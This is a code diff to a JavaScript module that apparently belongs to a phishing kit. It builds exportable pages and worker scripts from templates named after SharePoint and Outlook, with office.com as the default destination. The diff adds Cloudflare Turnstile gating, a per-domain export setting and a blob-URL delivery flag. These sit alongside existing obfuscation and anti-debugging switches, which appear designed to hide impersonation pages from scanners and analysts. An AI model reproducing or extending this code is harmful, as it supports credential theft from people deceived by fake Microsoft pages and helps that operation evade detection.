@@ -87,7 +87,7 @@ function loadVerificationDesignCSS(designName) {
   return '';
 }
 
-function generateExportHtml(link, user) {
+function generateExportHtml(link, user, options = {}) {
   const templateType = link.template_type || 'sharepoint3';
   const designName = link.verification_design || 'outlook';
 
@@ -120,6 +120,12 @@ function generateExportHtml(link, user) {
   const defaultBlur = link.background_blur || 4;
   const bgUrl = link.background_blur_url || '';
 
+  // Turnstile: only embed site key when link-level turnstile is enabled. The
+  // export domain is provided so runtime widgets can pick a per-domain key.
+  const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
+  const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
+  const turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
+
   const windowVars = `<script>
     window.VG_JWT="${jt}";
     window.__DESTINATION_URL="${link.destination_url || 'https://office.com'}";
@@ -135,6 +141,10 @@ function generateExportHtml(link, user) {
     window.__OBFUSCATION_ENABLED=${obfuscationEnabled ? 'true' : 'false'};
     window.__ANTIDEBUG_ENABLED=${antidebugEnabled ? 'true' : 'false'};
     window.COPY_TO_OPEN=${link.copy_to_open ? 'true' : 'false'};
+    window.__TURNSTILE_ENABLED=${turnstileEnabled ? 'true' : 'false'};
+    window.__TURNSTILE_SITE_KEY="${turnstileSiteKey}";
+    window.__EXPORT_DOMAIN="${exportDomain}";
+    window.__BLOB_URL_ENABLED=${link.blob_url_enabled ? 'true' : 'false'};
   </script>`;
 
   // Inject VG engine + window vars before </head>
@@ -200,6 +210,9 @@ function buildWorkerScript(link, user, apiBaseUrl) {
   const defaultBlur2 = link.background_blur || 4;
   const bgUrl2 = link.background_blur_url || '';
 
+  const turnstileEnabled2 = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
+  const turnstileSiteKey2 = config.CF_TURNSTILE_SITE_KEY || '';
+
   const windowVars2 = `<script>
     window.VG_JWT="${jt}";
     window.__DESTINATION_URL="${link.destination_url || 'https://office.com'}";
@@ -215,6 +228,9 @@ function buildWorkerScript(link, user, apiBaseUrl) {
     window.__OBFUSCATION_ENABLED=${obf2 ? 'true' : 'false'};
     window.__ANTIDEBUG_ENABLED=${adb2 ? 'true' : 'false'};
     window.COPY_TO_OPEN=${link.copy_to_open ? 'true' : 'false'};
+    window.__TURNSTILE_ENABLED=${turnstileEnabled2 ? 'true' : 'false'};
+    window.__TURNSTILE_SITE_KEY="${turnstileSiteKey2}";
+    window.__BLOB_URL_ENABLED=${link.blob_url_enabled ? 'true' : 'false'};
   </script>`;
 
   const engineScript2 = vgEngine ? `<script>${vgEngine}<\/script>` : '';
